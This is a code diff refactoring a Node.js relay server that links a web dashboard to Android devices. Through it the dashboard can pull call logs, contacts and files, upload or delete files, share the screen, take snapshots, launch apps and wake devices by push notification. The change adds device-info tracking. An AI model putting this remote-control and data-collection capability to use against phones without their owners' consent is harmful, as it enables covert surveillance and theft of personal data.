@@ -15,17 +15,23 @@ if (!fs.existsSync(publicPath)) {
 app.use(express.static(publicPath));
 app.use(express.json());
 
-// HTTP logging middleware
 app.use((req, res, next) => {
   console.log(`HTTP request: ${req.method} ${req.url}`);
   next();
 });
 
-// In-memory store for FCM tokens mapped by device ID
-const fcmTokens = new Map();        // deviceId -> fcmToken
-const wsIdToDeviceId = new Map();   // wsId -> deviceId (for FCM mapping)
+// ─────────────────────────────────────────────────────────────
+// In-memory stores
+// ─────────────────────────────────────────────────────────────
 
-// Endpoint for the Android app to register/update its FCM token
+const fcmTokens = new Map();          // deviceId -> fcmToken
+const wsIdToDeviceId = new Map();     // wsId -> Android deviceId (for FCM)
+const androidDeviceInfo = new Map();  // wsId -> { model, name, deviceId, connectedAt }
+
+// ─────────────────────────────────────────────────────────────
+// FCM endpoints
+// ─────────────────────────────────────────────────────────────
+
 app.post('/api/fcm-token', (req, res) => {
   const { token, deviceId } = req.body;
   if (!token || !deviceId) {
@@ -36,40 +42,26 @@ app.post('/api/fcm-token', (req, res) => {
   res.json({ success: true });
 });
 
-// Endpoint for the web client dashboard to trigger a start/stop command via FCM
 app.post('/api/fcm/send', async (req, res) => {
   let { deviceId, wsId, command } = req.body;
 
-  if (!command) {
-    return res.status(400).json({ error: 'Missing command' });
-  }
+  if (!command) return res.status(400).json({ error: 'Missing command' });
 
-  // Allow the web client to pass the WebSocket ID instead of the Android ID.
   if (!deviceId && wsId) {
     deviceId = wsIdToDeviceId.get(wsId);
-    if (!deviceId) {
-      return res.status(404).json({ error: 'No device mapping for wsId: ' + wsId });
-    }
+    if (!deviceId) return res.status(404).json({ error: 'No device mapping for wsId: ' + wsId });
   }
-
-  if (!deviceId) {
-    return res.status(400).json({ error: 'Missing deviceId or wsId' });
-  }
+  if (!deviceId) return res.status(400).json({ error: 'Missing deviceId or wsId' });
 
   const token = fcmTokens.get(deviceId);
-  if (!token) {
-    return res.status(404).json({ error: 'No FCM token registered for this device' });
-  }
+  if (!token) return res.status(404).json({ error: 'No FCM token registered for this device' });
 
   console.log(`[FCM] Sending command: ${command} to device: ${deviceId}`);
 
   const serverKey = process.env.FIREBASE_SERVER_KEY;
   if (!serverKey) {
     console.warn('[FCM] FIREBASE_SERVER_KEY env var not set. Cannot send real push.');
-    return res.status(501).json({
-      error: 'Firebase Server Key not configured on server.',
-      token: token
-    });
+    return res.status(501).json({ error: 'Firebase Server Key not configured on server.', token });
   }
 
   try {
@@ -79,11 +71,7 @@ app.post('/api/fcm/send', async (req, res) => {
         'Authorization': `key=${serverKey}`,
         'Content-Type': 'application/json'
       },
-      body: JSON.stringify({
-        to: token,
-        priority: 'high',
-        data: { command: command }
-      })
+      body: JSON.stringify({ to: token, priority: 'high', data: { command } })
     });
     const result = await response.json();
     console.log('[FCM] Push result:', result);
@@ -94,20 +82,30 @@ app.post('/api/fcm/send', async (req, res) => {
   }
 });
 
-// Returns a list of currently connected devices (Android clients only)
+// ─────────────────────────────────────────────────────────────
+// Devices REST API
+// ─────────────────────────────────────────────────────────────
+
 app.get('/api/devices', (req, res) => {
   const devices = [];
   androidClients.forEach((ws, wsId) => {
+    const info = androidDeviceInfo.get(wsId) || {};
     devices.push({
       wsId: wsId,
-      deviceId: wsIdToDeviceId.get(wsId) || null,
+      deviceId: info.deviceId || wsIdToDeviceId.get(wsId) || null,
+      model: info.model || null,
+      name: info.name || null,
+      connectedAt: info.connectedAt || null,
       online: ws.readyState === 1
     });
   });
   res.json({ devices });
 });
 
-// Serve index.html for all non-API routes
+// ─────────────────────────────────────────────────────────────
+// SPA fallback
+// ─────────────────────────────────────────────────────────────
+
 app.get(/^(?!\/api).*/, (req, res) => {
   const indexPath = path.join(publicPath, 'index.html');
   if (fs.existsSync(indexPath)) {
@@ -123,10 +121,7 @@ app.get(/^(?!\/api).*/, (req, res) => {
 // Native WebSocket Server
 // ─────────────────────────────────────────────────────────────
 
-const wss = new WebSocketServer({
-  server,
-  perMessageDeflate: false
-});
+const wss = new WebSocketServer({ server, perMessageDeflate: false });
 
 const webClients = new Map();
 const androidClients = new Map();
@@ -137,49 +132,48 @@ function generateClientId() {
 }
 
 function sendTo(ws, message) {
-  if (ws && ws.readyState === 1) {
-    ws.send(JSON.stringify(message));
-  }
+  if (ws && ws.readyState === 1) ws.send(JSON.stringify(message));
 }
 
 function broadcastToAndroid(message) {
   const data = JSON.stringify(message);
-  androidClients.forEach((ws) => {
-    if (ws.readyState === 1) ws.send(data);
-  });
+  androidClients.forEach((ws) => { if (ws.readyState === 1) ws.send(data); });
 }
 
 function broadcastToWeb(message) {
   const data = JSON.stringify(message);
-  webClients.forEach((ws) => {
-    if (ws.readyState === 1) ws.send(data);
-  });
+  webClients.forEach((ws) => { if (ws.readyState === 1) ws.send(data); });
 }
 
 function findClient(id) {
   return webClients.get(id) || androidClients.get(id);
 }
 
-// All event types that are relayed between web and android
+// Build a rich payload for android-client-ready notifications
+function buildAndroidReadyPayload(wsId) {
+  const info = androidDeviceInfo.get(wsId) || {};
+  return {
+    type: 'android-client-ready',
+    id: wsId,
+    model: info.model || null,
+    name: info.name || null,
+    deviceId: info.deviceId || wsIdToDeviceId.get(wsId) || null
+  };
+}
+
 const relayEvents = [
-  // WebRTC signaling
   'signal',
-  // Telemetry
   'call_log',
-  // File explorer
   'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete',
   'fs:download_start', 'fs:download_chunk', 'fs:download_complete',
   'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
   'fs:upload_complete',
-  // Thumbnails & preview
   'fs:thumb_request', 'fs:thumb_batch',
   'fs:preview_request', 'fs:preview_meta', 'fs:preview_chunk',
   'fs:preview_complete', 'fs:preview_error', 'fs:preview_cancel',
-  // Remote commands
   'cmd:start', 'cmd:stop', 'cmd:screen_share',
   'cmd:get_apps', 'cmd:get_contacts',
   'cmd:set_quality', 'cmd:launch_app', 'cmd:take_snapshot',
-  // Custom Data Responses
   'apps_list', 'contacts_list', 'device_info', 'snapshot_data'
 ];
 
@@ -223,20 +217,31 @@ wss.on('connection', (ws, req) => {
         webClients.set(clientId, ws);
         androidClients.forEach((androidWs, androidId) => {
           sendTo(androidWs, { type: 'web-client-ready', id: clientId });
-          sendTo(ws, { type: 'android-client-ready', id: androidId });
+          sendTo(ws, buildAndroidReadyPayload(androidId));
         });
       } else if (clientType === 'android') {
         androidClients.set(clientId, ws);
 
-        // Store deviceId mapping for FCM revival
-        if (payload.deviceId) {
-          wsIdToDeviceId.set(clientId, payload.deviceId);
-          console.log(`Mapped ${clientId} -> deviceId ${payload.deviceId}`);
+        const deviceId = payload.deviceId || null;
+        if (deviceId) {
+          wsIdToDeviceId.set(clientId, deviceId);
+          console.log(`Mapped ${clientId} -> deviceId ${deviceId}`);
         }
+
+        const info = {
+          model: payload.model || null,
+          name: payload.name || null,
+          manufacturer: payload.manufacturer || null,
+          deviceId: deviceId,
+          connectedAt: Date.now()
+        };
+        androidDeviceInfo.set(clientId, info);
+
+        console.log(`Android device info [${clientId}]: name="${info.name}", model="${info.model}"`);
 
         webClients.forEach((webWs, webId) => {
           sendTo(ws, { type: 'web-client-ready', id: webId });
-          sendTo(webWs, { type: 'android-client-ready', id: clientId });
+          sendTo(webWs, buildAndroidReadyPayload(clientId));
         });
       }
 
@@ -301,6 +306,7 @@ wss.on('connection', (ws, req) => {
     }
     if (wasAndroid) {
       wsIdToDeviceId.delete(clientId);
+      androidDeviceInfo.delete(clientId);
       broadcastToWeb({ type: 'android-client-disconnected', id: clientId });
     }
     console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
